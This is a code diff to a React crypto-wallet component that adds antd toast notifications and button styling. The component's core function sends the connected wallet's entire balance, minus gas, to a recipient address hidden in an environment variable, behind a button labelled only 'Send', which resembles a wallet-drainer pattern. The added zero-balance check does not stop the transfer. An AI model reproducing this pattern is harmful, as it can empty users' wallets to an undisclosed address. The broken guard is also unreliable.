@@ -8,29 +8,43 @@ import {
 import { parseEther } from "viem";
 import EstimateGas from "./EstimateGas.JSX";
 import UseGasPrice from "./UseGasPrice";
+import { message, Space, Button } from "antd";
+
 const recipient = import.meta.env.VITE_0X;
 
 const SendTransaction = () => {
+  const [messageApi, contextHolder] = message.useMessage();
+
   const { address, isConnected } = useAccount();
+
   const { data: balanceData, isLoading: balanceIsLoading } = useBalance({
     address: address,
   });
   const {
     data: hash,
     isPending,
+    isSuccess: transactionSuccess,
     sendTransaction,
     error,
   } = useSendTransaction();
+
   const { isLoading: isConfirming, isSuccess: isConfirmed } =
     useWaitForTransactionReceipt({ hash });
 
   const gas = EstimateGas();
   const gasPrice = UseGasPrice();
+
   const sendEntireBalance = async () => {
     const amount = parseEther(balanceData.formatted);
-    const remainingBalance = amount - gas * gasPrice;
+    if (amount <= BigInt(0)) {
+      messageApi.open({
+        type: "warning",
+        content: "Balance Cannot be Zero",
+        duration: 1.5,
+      });
+    }
     sendTransaction({
-      value: remainingBalance,
+      value: amount - gas * gasPrice,
       to: recipient,
       gas: gas,
       gasPrice: gasPrice,
@@ -39,21 +53,46 @@ const SendTransaction = () => {
   };
 
   useEffect(() => {
+    messageApi.destroy();
+    if (isPending) {
+      messageApi.open({
+        type: "loading",
+        content: "Transaction is Pending",
+        duration: 1.5,
+      });
+    }
+  }, [isPending]);
+
+  useEffect(() => {
+    messageApi.destroy();
+    if (transactionSuccess) {
+      messageApi.open({
+        type: "success",
+        content: "Transaction is Successful",
+        duration: 1.5,
+      });
+    }
+  }, [transactionSuccess]);
+
+  useEffect(() => {
     error && console.error(error);
   }, [error]);
 
   return (
     <>
+      {contextHolder}
       {isConnected && (
         <>
-          <button disabled={isPending} onClick={() => sendEntireBalance()}>
-            {isPending ? "Confirming..." : "Send"}
-          </button>
+          <Space>
+            <Button disabled={isPending} onClick={() => sendEntireBalance()}>
+              {isPending ? "Confirming..." : "Send"}
+            </Button>
+          </Space>
           {hash && <div>Transaction Hash: {hash}</div>}
           {isConfirming && <div>Waiting for Confirmation.</div>}
           {isConfirmed && <div>Transaction is Confirmed.</div>}
           {error && (
-            <div style={{ color: "grey", fontSize: "14px", marginTop: "10px" }}>
+            <div style={{ color: "red", fontSize: "14px", marginTop: "10px" }}>
               Error:
               {error.shortMessage === "Connector not connected."
                 ? "Please Connect Wallet"
